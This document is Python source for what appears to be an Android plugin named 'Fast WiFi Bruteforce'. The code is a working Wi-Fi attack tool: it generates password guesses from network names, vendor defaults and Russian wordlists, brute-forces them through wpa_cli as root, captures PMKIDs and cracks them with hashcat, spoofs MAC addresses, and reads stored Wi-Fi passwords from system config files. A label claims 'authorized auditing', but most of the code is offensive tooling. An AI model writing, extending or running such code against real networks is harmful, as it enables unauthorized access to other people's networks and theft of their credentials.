    # ═══════════ UTILITIES ═══════════

    @staticmethod
    def _text(value):
        if value is None:
            return ""
        if isinstance(value, bytes):
            return value.decode("utf-8", errors="replace")
        if isinstance(value, (list, tuple)):
            return "\n".join(FastWiFiBruteforce._text(x) for x in value)
        return str(value)

    @staticmethod
    def _shq(value):
        value = str(value)
        if "\x00" in value:
            raise ValueError("NUL is not allowed in a shell argument")
        return "'" + value.replace("'", "'\\''") + "'"

    @staticmethod
    def _path(value):
        path = os.path.normpath(str(value or "/sdcard"))
        if path != "/sdcard" and not path.startswith("/sdcard/"):
            raise ValueError("Only paths inside /sdcard are allowed")
        if any(c in path for c in ("\x00", "\r", "\n")):
            raise ValueError("Invalid file name")
        return path

    @staticmethod
    def _bool(value):
        if isinstance(value, str):
            return value.lower() in ("true", "1", "yes", "on")
        return bool(value)

    @staticmethod
    def _valid_password(value):
        if any(c in value for c in ("\x00", "\r", "\n")):
            return False
        try:
            size = len(value.encode("utf-8"))
        except UnicodeError:
            return False
        if 8 <= len(value) and 8 <= size <= 63:
            return True
        return len(value) == 64 and re.fullmatch(
            r"[0-9a-fA-F]{64}", value) is not None

    @staticmethod
    def _valid_wep(value):
        if any(c in value for c in ("\x00", "\r", "\n")):
            return False
        v = str(value)
        if not re.fullmatch(r"[0-9a-fA-F]+", v):
            return False
        return len(v) in (10, 26, 32)

    @staticmethod
    def _format_eta(seconds):
        try:
            seconds = int(max(0, round(float(seconds))))
        except (TypeError, ValueError):
            return "—"
        if seconds <= 0:
            return "—"
        if seconds < 60:
            return "{} s".format(seconds)
        if seconds < 3600:
            return "{} min {} s".format(seconds // 60, seconds % 60)
        return "{} h {} min".format(seconds // 3600, (seconds % 3600) // 60)

    @staticmethod
    def _mask_last4(password):
        try:
            p = str(password)
            if len(p) <= 4:
                return "…" + p
            return "…" + p[-4:]
        except Exception:
            return "…"

    @staticmethod
    def _call_or_prop(obj, name):
        try:
            value = getattr(obj, name)
        except Exception:
            return None
        if callable(value):
            try:
                return value()
            except Exception:
                return None
        return value

    @staticmethod
    def _oui_of(bssid):
        try:
            parts = str(bssid).lower().split(":")
            if len(parts) >= 3:
                return "".join(p.upper() for p in parts[:3])
        except Exception:
            pass
        return ""

    def _vendor_for_bssid(self, bssid):
        try:
            oui = self._oui_of(bssid)
            if not oui:
                return ""
            for vendor, ouis in self.OUI_VENDORS.items():
                if oui in ouis:
                    return vendor
        except Exception:
            pass
        return ""

    def _vendor_defaults_for_bssid(self, bssid):
        out = []
        seen = set()

        def add(p):
            p = str(p)
            if p in seen:
                return
            if not self._valid_password(p):
                return
            seen.add(p)
            out.append(p)

        vendor = self._vendor_for_bssid(bssid)
        if vendor:
            for pw in self.VENDOR_DEFAULTS.get(vendor, []):
                add(pw)
            self._log("info", "Vendor by OUI: " + vendor)

        clean = str(bssid).replace(":", "").replace("-", "").lower()
        if len(clean) >= 8:
            last8 = clean[-8:]
            add(last8)
            add(last8.upper())
            add("admin" + last8[:5])
            add(last8[:6] + "123")
        if len(clean) >= 6:
            add(clean[-6:] + "1234")

        for pw in ["12345678", "password", "admin123", "1234567890",
                   "qwerty123", "87654321", "admin1234", "admin12345"]:
            add(pw)

        return out

    def _generate_morphs(self, word):
        if not word or len(word) < 4:
            return []
        out = set()
        out.add(word)
        out.add(word.lower())
        out.add(word.upper())
        out.add(word.capitalize())

        low = word.lower()
        for i, ch in enumerate(low):
            if ch in self.LEET_MAP:
                for sub in self.LEET_MAP[ch]:
                    if sub == ch:
                        continue
                    out.add(low[:i] + sub + low[i+1:])

        full = []
        for ch in low:
            if ch in self.LEET_MAP and len(self.LEET_MAP[ch]) > 1:
                full.append(self.LEET_MAP[ch][1])
            else:
                full.append(ch)
        out.add("".join(full))

        for suf in ["123", "1234", "12345", "123456", "1", "12",
                    "2020", "2021", "2022", "2023", "2024", "2025"]:
            out.add(word + suf)
            out.add(low + suf)
            out.add(low.capitalize() + suf)

        for sym in ["!", "@", "#", "$"]:
            out.add(word + sym)
            out.add(low + sym)

        result = []
        seen = set()
        for w in out:
            if w in seen:
                continue
            if not (8 <= len(w) <= 63):
                continue
            seen.add(w)
            result.append(w)
            if len(result) >= 200:
                break
        return result

    @staticmethod
    def _generate_from_ssid(ssid):
        if not ssid:
            return []
        out = []
        seen = set()

        def add(p):
            p = str(p)
            if p in seen:
                return
            if not (8 <= len(p) <= 63):
                return
            seen.add(p)
            out.append(p)

        clean = str(ssid).strip()
        lower = clean.lower()
        upper = clean.upper()
        parts = [p for p in re.split(r"[\s_\-\.]+", clean) if p]
        digits = re.findall(r"\d+", clean)

        suffixes = ["123", "1234", "12345", "123456", "12345678",
                    "2020", "2021", "2022", "2023", "2024", "2025", "2026",
                    "!", "@123", "#123", "321", "111", "000", "007",
                    "777", "999", "555", "88", "66", "11", "01",
                    "wifi", "WiFi", "admin", "home", "net", "internet"]

        for s in (clean, lower, upper):
            for suf in suffixes:
                add(s + suf)
            for y in range(1990, 2031):
                add(s + str(y))
            add(s + "!")
            add(s + "@")
            add(s + "*")
            add("!" + s)
            add(s + s)

        for part in parts:
            add(part)
            add(part.lower())
            for suf in suffixes[:15]:
                add(part + suf)
            for y in [2020, 2021, 2022, 2023, 2024, 2025, 2026]:
                add(part + str(y))

        if len(parts) >= 2:
            for i, p1 in enumerate(parts):
                for j, p2 in enumerate(parts):
                    if i == j:
                        continue
                    add(p1 + p2)
                    add(p1 + p2 + "123")
                    add(p1.lower() + p2.lower())
                    add(p1.lower() + "_" + p2.lower())

        for pre in ["admin", "root", "user", "test", "pass", "wifi",
                    "home", "net", "internet", "modem", "router"]:
            add(pre + clean)
            add(pre + lower)
            add(pre + "_" + clean)

        for d in digits:
            for suf in ["", "123", "0", "00", "1", "12"]:
                add(d + suf)
                add("pass" + d + suf)
                add("admin" + d + suf)
                add("wifi" + d + suf)

        for d in ["12345678", "123456789", "1234567890", "password",
                  "admin123", "qwerty123", "11111111", "00000000"]:
            add(d)

        return out[:500]

    def _generate_ru_candidates(self, ssid):
        out = []
        seen = set()

        def add(p):
            p = str(p)
            if p in seen:
                return
            if not (8 <= len(p) <= 63):
                return
            seen.add(p)
            out.append(p)

        for w in self.RU_WORDS:
            try:
                size = len(w.encode("utf-8"))
            except Exception:
                continue
            if size >= 8:
                add(w)
            add(w + "123")
            add(w + "2024")
            add(w + "2025")

        suffixes = ["123", "1234", "!", "1", "007", "2010", "2015"]

        for name in self.RU_NAMES_LATIN:
            add(name)
            for y in [1980, 1985, 1990, 1995, 2000, 2005, 2010, 2015, 2020]:
                add(name + str(y))
            for suf in suffixes[:4]:
                add(name + suf)
            add(name.capitalize())
            add(name.capitalize() + "123")

        for name in self.RU_NAMES_CYRILLIC:
            try:
                size = len(name.encode("utf-8"))
            except Exception:
                continue
            if size >= 8:
                add(name)
            add(name + "123")
            add(name + "2020")

        if self._use_morph:
            extra_words = ["password", "admin", "welcome", "qwerty",
                           "love", "hello", "wifi", "internet"]
            for w in extra_words:
                for m in self._generate_morphs(w):
                    add(m)
            for w in self.RU_WORDS[:10]:
                for m in self._generate_morphs(w):
                    add(m)

        if ssid:
            low = str(ssid).lower().strip()
            for y in [str(y) for y in range(1980, 2026)]:
                add(low + y)
                add(low + "_" + y)
            for w in self.RU_WORDS[:20]:
                if low.startswith(w) or w.startswith(low[:3]):
                    add(w + "123")

        return out[:800]

    # ═══════════ ROOT / WPA_CLI ═══════════

    def _try_shell_uid(self, mode):
        try:
            if mode == "shizuku":
                raw = self.shizuku("id -u")
            elif mode == "root":
                raw = self.root("id -u")
            else:
                return ""
        except Exception as exc:
            self._log("warning", "{} id -u: {}".format(mode, str(exc)[:150]))
            return ""

        text = ""
        if isinstance(raw, bytes):
            try:
                text = raw.decode("utf-8", errors="replace")
            except Exception:
                text = ""
        elif isinstance(raw, dict):
            for key in ("out", "stdout", "output"):
                if raw.get(key):
                    text = str(raw[key])
                    break
        elif raw is not None:
            text = str(raw)

        text = text.strip()
        if not text:
            return ""
        first = text.splitlines()[0].strip()
        if first in ("2000", "0"):
            return first
        m = re.search(r"uid=(\d+)", first)
        if m and m.group(1) in ("2000", "0"):
            return m.group(1)
        return ""

    def _detect_root(self):
        try:
            uid = self._try_shell_uid("root")
            if uid == "0":
                self._root_available = True
                return
        except Exception:
            pass
        self._root_available = False

    def _find_wpa_cli(self):
        if not self._root_available:
            return
        for path in self.WPA_CLI_PATHS:
            try:
                raw = self.root("test -x {} && echo yes || echo no".format(
                    self._shq(path)))
                text = ""
                if isinstance(raw, dict):
                    text = str(raw.get("out") or raw.get("stdout") or "")
                else:
                    text = str(raw)
                if "yes" in text.lower():
                    self._wpa_cli_path = path
                    self._wpa_cli_available = True
                    return
            except Exception:
                continue

    def _find_hashcat(self):
        if not self._root_available:
            return
        for path in self.HASHCAT_PATHS:
            try:
                raw = self.root("test -x {} && echo yes || echo no".format(
                    self._shq(path)))
                text = ""
                if isinstance(raw, dict):
                    text = str(raw.get("out") or raw.get("stdout") or "")
                else:
                    text = str(raw)
                if "yes" in text.lower():
                    self._hashcat_path = path
                    return
            except Exception:
                continue
        self._hashcat_path = ""

    def _detect_wpa_ctrl(self):
        if not self._root_available:
            return
        for d in self.WPA_CTRL_DIRS:
            try:
                raw = self.root("ls {} 2>/dev/null".format(self._shq(d)))
                text = ""
                if isinstance(raw, dict):
                    text = str(raw.get("out") or raw.get("stdout") or "")
                else:
                    text = str(raw)
                if text.strip():
                    self._wpa_ctrl_dir = d
                    return
            except Exception:
                continue

    def _wpa_cli(self, cmd):
        if not (self._wpa_cli_available and self._root_available):
            return ""
        parts = [self._wpa_cli_path,
                 "-i", self._shq(self._wpa_iface)]
        if self._wpa_ctrl_dir:
            parts.extend(["-p", self._shq(self._wpa_ctrl_dir)])
        parts.append(cmd)
        full = " ".join(parts)
        try:
            raw = self.root(full)
            if isinstance(raw, dict):
                return str(raw.get("out") or raw.get("stdout") or "")
            return str(raw or "")
        except Exception as exc:
            self._log("warning", "wpa_cli: " + str(exc)[:150])
            return ""

    def _setup_wpa_cli_network(self, ssid, security):
        if not (self._wpa_cli_available and self._root_available):
            return False
        try:
            self._wpa_cli("remove_network all")
            raw = self._wpa_cli("add_network").strip()
            net_id = ""
            for line in raw.splitlines():
                line = line.strip()
                if line.isdigit():
                    net_id = line
                    break
            if not net_id:
                return False
            self._wpa_net_id = net_id

            try:
                ssid_hex = ssid.encode("utf-8").hex()
            except Exception:
                return False
            self._wpa_cli("set_network {} ssid {}".format(net_id, ssid_hex))

            if security == "sae":
                self._wpa_cli("set_network {} key_mgmt SAE".format(net_id))
            elif security == "wep":
                self._wpa_cli("set_network {} key_mgmt NONE".format(net_id))
            else:
                self._wpa_cli("set_network {} key_mgmt WPA-PSK".format(net_id))

            self._wpa_cli("set_network {} psk {}".format(
                net_id, "582e706c616365686f6c646572"))
            self._wpa_cli("disable_network {}".format(net_id))
            self._log("success",
                      "wpa_cli: network prepared (id={})".format(net_id))
            return True
        except Exception as exc:
            self._log("warning", "setup wpa_cli: " + str(exc)[:150])
            return False

    def _try_password_wpa_cli(self, password, settle):
        if not self._wpa_net_id:
            return None
        try:
            try:
                psk_hex = password.encode("utf-8").hex()
            except Exception:
                return None
            self._wpa_cli("set_network {} psk {}".format(
                self._wpa_net_id, psk_hex))
            self._wpa_cli("enable_network {}".format(self._wpa_net_id))
            self._wpa_cli("reattach")
        except Exception as exc:
            self._log("warning", "wpa_cli connect: " + str(exc)[:150])
            return None

        deadline = time.monotonic() + settle
        while time.monotonic() < deadline:
            if self._stop.is_set():
                return None
            try:
                status = self._wpa_cli("status")
            except Exception:
                status = ""
            state = ""
            for line in status.splitlines():
                if line.startswith("wpa_state="):
                    state = line.split("=", 1)[1].strip()
                    break
            if state == "COMPLETED":
                return True
            if self._stop.wait(0.1):
                return None
        return False

    # ═══════════ PMKID + HASHCAT ═══════════

    def _capture_pmkid(self):
        if not (self._root_available and self._wpa_cli_available):
            self._toast("Root and wpa_cli required")
            return
        if self._busy:
            self._toast("Wait for the operation to finish")
            return

        bssid = self._network.get("bssid", "")
        if not bssid:
            self._toast("Select a network first")
            return

        self._log("info", "=== PMKID capture for " + bssid + " ===")
        self._outcome = "Capturing PMKID…"

        def job():
            try:
                self._wpa_cli("set_debug 1")
                raw = self._wpa_cli("pmksa")
                self._wpa_cli("set_debug 0")

                found_pmkid = ""
                found_bssid = ""
                cur_pmkid = ""
                for line in raw.splitlines():
                    line = line.strip()
                    if line.startswith("pmkid="):
                        cur_pmkid = line.split("=", 1)[1].strip()
                    elif line.startswith("bssid=") and cur_pmkid:
                        cur_bssid = line.split("=", 1)[1].strip()
                        if cur_bssid.lower() == bssid.lower():
                            found_pmkid = cur_pmkid
                            found_bssid = cur_bssid
                            break
                        cur_pmkid = ""

                if not found_pmkid and cur_pmkid:
                    found_pmkid = cur_pmkid

                if not found_pmkid:
                    self._log("warning",
                              "PMKID not found in the PMKSA cache. "
                              "Connect to the network first.")
                    self._outcome = "PMKID not found"
                    self._toast("PMKID not found")
                    return

                clean_pmkid = found_pmkid.replace(":", "").lower()
                self._pmkid_hash = clean_pmkid
                self._pmkid_ssid = self._network.get("ssid", "")
                self._pmkid_bssid = found_bssid or bssid

                ssid_hex = self._pmkid_ssid.encode("utf-8").hex()
                ap_hex = self._pmkid_bssid.replace(":", "").lower()
                sta_hex = "000000000000"
                hash_line = "WPA*01*{}*{}*{}*{}***".format(
                    clean_pmkid, ap_hex, sta_hex, ssid_hex)
                self._pmkid_hex = hash_line

                self._log("success",
                          "PMKID captured: " + clean_pmkid[:16] + "…")
                self._outcome = "PMKID ready for hashcat"
                self._toast("PMKID captured")
            except Exception as exc:
                self._log("error", "capture pmkid: " + str(exc)[:200])
                self._outcome = "PMKID error"
            finally:
                self._refresh(force=True)

        self._launch(job, "io")

    def _crack_with_hashcat(self):
        if not self._pmkid_hex:
            self._toast("Capture the PMKID first")
            return
        if not self._root_available:
            self._toast("Root required")
            return
        if not self._hashcat_path:
            self._toast("hashcat not found")
            return
        if not self._enabled_dicts:
            self._toast("An enabled dictionary is required")
            return
        if self._busy:
            self._toast("Wait for the operation to finish")
            return

        self._log("info", "=== hashcat PMKID ===")
        self._outcome = "Offline cracking…"

        def job():
            try:
                hash_file = "/sdcard/Download/_pmkid.hc22000"
                with open(hash_file, "w") as f:
                    f.write(self._pmkid_hex + "\n")
                self._log("info", "Hash: " + hash_file)

                wordlist = self._enabled_dicts[0]
                potfile = "/sdcard/Download/_pmkid.potfile"

                cmd = "{} -m 22000 --potfile-path {} {} {}".format(
                    self._shq(self._hashcat_path),
                    self._shq(potfile),
                    self._shq(hash_file),
                    self._shq(wordlist))
                self._log("info", "hashcat: " + cmd)

                raw = self.root(cmd)
                if isinstance(raw, dict):
                    out = (str(raw.get("out") or "")
                           + "\n" + str(raw.get("err") or ""))
                else:
                    out = str(raw or "")
                self._log("info", "hashcat out: " + out[:500])

                try:
                    pot_raw = self.root(
                        "cat {} 2>/dev/null".format(self._shq(potfile)))
                    if isinstance(pot_raw, dict):
                        pot_text = str(pot_raw.get("out") or "")
                    else:
                        pot_text = str(pot_raw or "")
                except Exception:
                    pot_text = ""

                found = ""
                for line in pot_text.splitlines():
                    parts = line.split(":")
                    if len(parts) >= 2 and parts[-1]:
                        found = parts[-1].strip()
                        break

                if found:
                    self._found_password = found
                    self._reveal = True
                    self._outcome = "✅ hashcat: password found"
                    self._log("success", "hashcat: found")
                    self._notify_found(
                        self._network.get("ssid", ""), found)
                else:
                    self._outcome = "❌ hashcat: not found"
                    self._log("warning", "hashcat: empty result")

            except Exception as exc:
                self._log("error", "hashcat: " + str(exc)[:200])
                self._outcome = "hashcat error"
            finally:
                self._refresh(force=True)

        self._launch(job, "io")

    # ═══════════ MAC SPOOF ═══════════

    @staticmethod
    def _rand_mac():
        import random
        return "02:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}".format(
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255))

    def _spoof_mac(self):
        if not (self._use_mac_spoof and self._root_available):
            return True
        mac = self._rand_mac()
        try:
            self.root("ip link set {} down".format(self._wpa_iface))
            self.root("ip link set {} address {}".format(
                self._wpa_iface, mac))
            self.root("ip link set {} up".format(self._wpa_iface))
            self._log("info", "MAC changed: " + mac)
            return True
        except Exception as exc:
            self._log("warning", "spoof mac: " + str(exc)[:150])
            return False

    # ═══════════ SAVED WIFI ═══════════

    def _read_saved_wifi(self):
        if not self._root_available:
            return []
        out = []
        for path in self.WIFI_CONFIG_PATHS:
            try:
                raw = self.root("cat {} 2>/dev/null".format(self._shq(path)))
                if isinstance(raw, dict):
                    text = str(raw.get("out") or raw.get("stdout") or "")
                else:
                    text = str(raw or "")
                if not text.strip():
                    continue
                if path.endswith(".xml"):
                    parsed = self._parse_wifi_xml(text)
                else:
                    parsed = self._parse_wpa_conf(text)
                if parsed:
                    out.extend(parsed)
                    self._log("info",
                              "Saved Wi-Fi networks: {} from {}".format(
                                  len(parsed), path))
                    break
            except Exception as exc:
                self._log("warning", "read saved: " + str(exc)[:150])
        return out

    @staticmethod
    def _parse_wifi_xml(text):
        out = []
        try:
            root = ET.fromstring(text)
        except Exception:
            return out

        def decode_b64(s):
            try:
                # If there is an "=" at the end or the string is long, it looks like base64
                if len(s) > 3 and (s.endswith("=") or len(s) % 4 == 0):
                    return base64.b64decode(s).decode("utf-8", errors="replace")
            except Exception:
                pass
            return s

        for net in root.iter():
            if not net.tag.endswith("WifiConfiguration"):
                continue
            ssid = ""
            psk = ""
            bssid = ""
            for child in net:
                if child.tag.endswith("string"):
                    name = child.get("name")
                    if name == "SSID" and child.text:
                        ssid = decode_b64(child.text)
                    elif name == "PreSharedKey" and child.text:
                        psk = decode_b64(child.text)
                    elif name == "BSSID" and child.text:
                        bssid = child.text
            if ssid and psk:
                out.append({"ssid": ssid, "psk": psk,
                            "bssid": bssid, "key_mgmt": ""})
        return out

    @staticmethod
    def _parse_wpa_conf(text):
        out = []
        cur = {}
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("network={"):
                cur = {}
                continue
            if line == "}":
                if cur.get("ssid") and cur.get("psk"):
                    out.append({
                        "ssid": cur["ssid"], "psk": cur["psk"],
                        "bssid": cur.get("bssid", ""),
                        "key_mgmt": cur.get("key_mgmt", ""),
                    })
                cur = {}
                continue
            if "=" in line:
                k, v = line.split("=", 1)
                cur[k.strip()] = v.strip().strip('"')
        return out

    def _refresh_saved_wifi(self):
        try:
            items = self._read_saved_wifi()
            with self._saved_wifi_lock:
                self._saved_wifi = items
            self._show_saved_psk = {}
            self._toast("Saved Wi-Fi networks: {}".format(len(items)))
        except Exception as exc:
            self._log("error", "refresh saved: " + str(exc)[:200])
            self._toast("Read error")

    def _toggle_saved_psk(self, ssid):
        if ssid in self._show_saved_psk:
            del self._show_saved_psk[ssid]
        else:
            self._show_saved_psk[ssid] = True
        self._refresh(force=True)

    # ═══════════ LOGS ═══════════

    def _log(self, level, message):
        text = self._text(message).replace("\x00", "")[:700]
        stamp = time.strftime("%H:%M:%S")
        with self._log_lock:
            self._logs.append((level, stamp, text))
            self._logs = self._logs[-self.MAX_LOGS:]

    def _toast(self, message):
        try:
            if self._ready:
                self.toast(self._text(message))
        except Exception:
            pass

    def _refresh(self, force=False):
        if not self._ready:
            return
        try:
            now = time.monotonic()
            with self._ui_lock:
                if not force:
                    if (now - self._last_ui_refresh) < (self.UI_THROTTLE_MS / 1000.0):
                        return
                self._last_ui_refresh = now
            self.refresh()
        except Exception:
            if not self._refresh_warning:
                self._refresh_warning = True
                self._log("warning",
                          "UI auto-refresh unavailable. Press \"Refresh\".")

    def _bind(self, callback, *bound_args):
        def invoke(*args, **kwargs):
            if not self._ready:
                return None
            try:
                return callback(*bound_args)
            except Exception as exc:
                self._log("error", str(exc)[:240])
                self._toast("Error. See the log for details.")
            finally:
                self._refresh(force=True)
            return None
        return invoke

    def _value(self, callback, refresh=False):
        def invoke(value=None, *args, **kwargs):
            if not self._ready:
                return None
            try:
                return callback(value)
            except Exception as exc:
                self._log("error", str(exc)[:240])
            finally:
                if refresh:
                    self._refresh(force=True)
            return None
        return invoke

    def _go(self, page):
        self._page = page
        self._last_ui_refresh = 0.0

    def _save(self):
        try:
            self.set_setting(self.STATE_KEY, {
                "network": dict(self._network),
                "folder": self._folder,
                "dicts": [{"path": p} for p in self._dicts],
                "enabled": list(self._enabled_dicts),
                "settle": self._settle,
                "use_ssid_gen": bool(self._use_ssid_gen),
                "use_vendor_gen": bool(self._use_vendor_gen),
                "use_ru_gen": bool(self._use_ru_gen),
                "use_morph": bool(self._use_morph),
                "adaptive": bool(self._use_adaptive_settle),
                "resume": bool(self._resume_enabled),
                "notify": bool(self._notify_on_found),
                "mac_spoof": bool(self._use_mac_spoof),
                "spoof_every": int(self._spoof_every),
            })
        except Exception as exc:
            self._log("warning",
                      "Failed to save settings: " + str(exc)[:180])

    # ═══════════ CHECKPOINT ═══════════

    def _dict_fingerprint(self):
        try:
            parts = sorted(self._enabled_dicts)
            if self._use_ssid_gen:
                parts.append("__gen_ssid__")
            if self._use_vendor_gen:
                parts.append("__gen_vendor__")
            if self._use_ru_gen:
                parts.append("__gen_ru__")
            if self._use_morph:
                parts.append("__gen_morph__")
            joined = "|".join(parts)
            return hashlib.sha256(joined.encode("utf-8")).hexdigest()[:16]
        except Exception:
            return ""

    def _save_checkpoint(self):
        if self._checked <= 0:
            return
        try:
            self.set_setting(self.CHECKPOINT_KEY, {
                "ssid": self._network.get("ssid", ""),
                "bssid": self._network.get("bssid", ""),
                "security": self._network.get("security", ""),
                "checked": int(self._checked),
                "total": int(self._total),
                "dict_fp": self._dict_fingerprint(),
                "ts": time.time(),
            })
        except Exception:
            pass

    def _load_checkpoint(self):
        try:
            data = self.get_setting(self.CHECKPOINT_KEY, {})
            if isinstance(data, str):
                try:
                    data = json.loads(data)
                except Exception:
                    return {}
            if not isinstance(data, dict):
                return {}
            return data
        except Exception:
            return {}

    def _checkpoint_summary(self):
        try:
            cp = self._load_checkpoint()
            if not cp or not cp.get("ssid"):
                return ""
            ssid = cp.get("ssid", "")
            checked = int(cp.get("checked", 0))
            total = int(cp.get("total", 0))
            ts = float(cp.get("ts", 0))
            if ssid != self._network.get("ssid", ""):
                return ""
            if cp.get("dict_fp") != self._dict_fingerprint():
                return ""
            when = ""
            try:
                delta = max(0, time.time() - ts)
                if delta < 60:
                    when = "{} s ago".format(int(delta))
                elif delta < 3600:
                    when = "{} min ago".format(int(delta // 60))
                elif delta < 86400:
                    when = "{} h ago".format(int(delta // 3600))
                else:
                    when = "{} d ago".format(int(delta // 86400))
            except Exception:
                pass
            if total:
                return "💾 {} · #{} of {} · {}".format(ssid, checked, total, when)
            return "💾 {} · #{} · {}".format(ssid, checked, when)
        except Exception:
            return ""

    def _clear_checkpoint(self):
        try:
            self.set_setting(self.CHECKPOINT_KEY, {})
            self._resume_from = 0
        except Exception:
            pass
        self._toast("Checkpoint reset")
        self._log("info", "Checkpoint reset by user")

    # ═══════════ NOTIFY ═══════════

    def _notify_found(self, ssid, password):
        if not self._notify_on_found:
            return
        try:
            android = self.api.getAndroid()
            android.notifyShow(
                "WiFi Audit: password found",
                "Network: {}. Open the plugin to view.".format(ssid))
        except Exception as exc:
            self._log("warning", "notify: " + str(exc)[:120])
        try:
            android = self.api.getAndroid()
            android.vibratePattern([300, 100, 300, 100, 600])
        except Exception:
            pass

    # ═══════════ RSSI ═══════════

    def _start_rssi_sampler(self):
        if self._rssi_thread is not None and self._rssi_thread.is_alive():
            return
        self._rssi_stop = threading.Event()

        def loop():
            while not self._rssi_stop.wait(self.RSSI_SAMPLE_INTERVAL):
                try:
                    if not self._ready:
                        continue
                    if not self._network.get("bssid"):
                        continue
                    self._sample_rssi_once()
                except Exception:
                    pass

        try:
            self._rssi_thread = threading.Thread(target=loop, daemon=True)
            self._rssi_thread.start()
        except Exception:
            self._rssi_thread = None

    def _stop_rssi_sampler(self):
        try:
            if self._rssi_stop is not None:
                self._rssi_stop.set()
        except Exception:
            pass
        self._rssi_thread = None

    def _sample_rssi_once(self):
        bssid = self._network.get("bssid", "")
        if not bssid:
            return
        rssi = None

        if self._shell_mode in ("shizuku", "root"):
            try:
                got = self._shell_lock.acquire(timeout=0.1)
                if not got:
                    return
                try:
                    if self._shell_mode == "shizuku":
                        raw = self.shizuku("cmd wifi list-scan-results")
                    else:
                        raw = self.root("cmd wifi list-scan-results")
                finally:
                    try:
                        self._shell_lock.release()
                    except Exception:
                        pass
                text = ""
                if isinstance(raw, dict):
                    for k in ("out", "stdout", "output"):
                        if raw.get(k):
                            text = str(raw[k])
                            break
                elif raw is not None:
                    text = str(raw)
                for line in text.splitlines():
                    item = self._parse_scan_line(line)
                    if item and item["bssid"] == bssid.lower():
                        rssi = item["rssi"]
                        break
            except Exception:
                pass

        if rssi is None:
            try:
                dev = self.api.getDevice()
                raw = dev.wifiScanResultsJson()
                if isinstance(raw, bytes):
                    raw = raw.decode("utf-8", errors="replace")
                if isinstance(raw, str):
                    try:
                        data = json.loads(raw)
                    except Exception:
                        data = []
                else:
                    data = raw or []
                if isinstance(data, list):
                    for item in data:
                        if not isinstance(item, dict):
                            continue
                        b = (item.get("BSSID")
                             or item.get("bssid") or "").lower()
                        if b == bssid.lower():
                            try:
                                rssi = int(item.get("level")
                                           or item.get("RSSI")
                                           or item.get("rssi") or -100)
                            except Exception:
                                rssi = -100
                            break
            except Exception:
                pass

        if rssi is not None:
            now = time.time()
            with self._rssi_lock:
                self._rssi_samples.append((now, int(rssi)))
                if len(self._rssi_samples) > self.MAX_RSSI_SAMPLES:
                    del self._rssi_samples[:-self.MAX_RSSI_SAMPLES]

    # ═══════════ LIFECYCLE ═══════════

    def on_plugin_load(self):
        if self._init_error:
            raise RuntimeError(self._init_error)
        if self._thread is not None and self._thread.is_alive():
            raise RuntimeError("The previous operation is still finishing")

        self._self_test_parser()

        self._stop.clear()
        self._busy = False
        self._running = False
        self._scanning = False
        self._consent = False
        self._copy_flash = 0
        self._finished = False
        self._last_connect_reply = ""
        with self._recent_lock:
            self._recent = []
        self._password_pool = []
        self._manual_password = ""
        self._manual_result = ""
        self._manual_busy = False
        self._shell_mode = "unknown"
        self._uid = ""
        self._shell_checked_with_api = False
        self._root_available = False
        self._wpa_cli_available = False
        self._wpa_cli_path = ""
        self._wpa_ctrl_dir = ""
        self._wpa_net_id = ""
        self._hashcat_path = ""
        self._pmkid_hash = ""
        self._pmkid_ssid = ""
        self._pmkid_bssid = ""
        self._pmkid_hex = ""
        self._saved_wifi = []
        self._show_saved_psk = {}
        self._settle_samples = deque(maxlen=30)
        with self._rssi_lock:
            self._rssi_samples = []
        self._show_help = False

        saved = self.get_setting(self.STATE_KEY, {})
        if isinstance(saved, str):
            try:
                saved = json.loads(saved)
            except Exception:
                saved = {}
        if not isinstance(saved, dict):
            saved = {}

        network = saved.get("network")
        self._network = (
            dict(network) if isinstance(network, dict)
            and isinstance(network.get("ssid"), str) else {}
        )
        if self._network.get("ssid"):
            try:
                self._network["ssid"] = str(self._network["ssid"]).strip()
            except Exception:
                pass

        try:
            self._folder = self._path(saved.get("folder", "/sdcard/Download"))
        except Exception:
            self._folder = "/sdcard/Download"

        try:
            self._settle = max(self.MIN_SETTLE,
                               min(self.MAX_SETTLE,
                                   float(saved.get("settle",
                                                   self.DEFAULT_SETTLE))))
        except Exception:
            self._settle = self.DEFAULT_SETTLE

        self._use_ssid_gen = bool(saved.get("use_ssid_gen", False))
        self._use_vendor_gen = bool(saved.get("use_vendor_gen", False))
        self._use_ru_gen = bool(saved.get("use_ru_gen", False))
        self._use_morph = bool(saved.get("use_morph", False))
        self._use_adaptive_settle = bool(saved.get("adaptive", False))
        self._resume_enabled = bool(saved.get("resume", True))
        self._notify_on_found = bool(saved.get("notify", True))
        self._use_mac_spoof = bool(saved.get("mac_spoof", False))
        try:
            self._spoof_every = max(5, min(50, int(saved.get("spoof_every", 10))))
        except Exception:
            self._spoof_every = 10

        self._dicts = {}
        records = saved.get("dicts", [])
        if isinstance(records, list):
            for record in records[:self.MAX_DICTS]:
                if not isinstance(record, dict) or not record.get("path"):
                    continue
                try:
                    path = self._path(record["path"])
                except Exception:
                    continue
                self._dicts[path] = {
                    "path": path,
                    "name": os.path.basename(path),
                    "count": None,
                    "valid": None,
                }

        enabled = saved.get("enabled", [])
        self._enabled_dicts = []
        if isinstance(enabled, list):
            for path in enabled:
                if (isinstance(path, str) and path in self._dicts
                        and path not in self._enabled_dicts):
                    self._enabled_dicts.append(path)

        try:
            found = self.get_setting(self.FOUND_KEY, {})
            if isinstance(found, str):
                try:
                    found = json.loads(found)
                except Exception:
                    found = {}
            if (isinstance(found, dict)
                    and found.get("password")
                    and found.get("ssid") == self._network.get("ssid", "")):
                self._found_password = str(found["password"])
                self._reveal = False
        except Exception:
            pass

        self.add_module(
            title="Fast WiFi Bruteforce",
            description="Networks · dictionaries · authorized auditing",
            icon="rounded:wifi_password",
            screen="main",
            section="PLUGINS"
        )

        self._ready = True

        try:
            self._detect_shell_mode()
        except Exception as exc:
            self._log("warning", "shell detect: " + str(exc)[:150])

        try:
            self._detect_root()
            if self._root_available:
                self._find_wpa_cli()
                self._find_hashcat()
                self._detect_wpa_ctrl()
                self._log("success", "Root available")
                self._log("info", "wpa_cli: " + (self._wpa_cli_path or "none"))
                self._log("info", "hashcat: " + (self._hashcat_path or "none"))
                self._log("info", "wpa_ctrl: " + (self._wpa_ctrl_dir or "none"))
            else:
                self._log("info", "Root not detected")
        except Exception as exc:
            self._log("warning", "root detect: " + str(exc)[:150])

        try:
            self._start_rssi_sampler()
        except Exception:
            pass

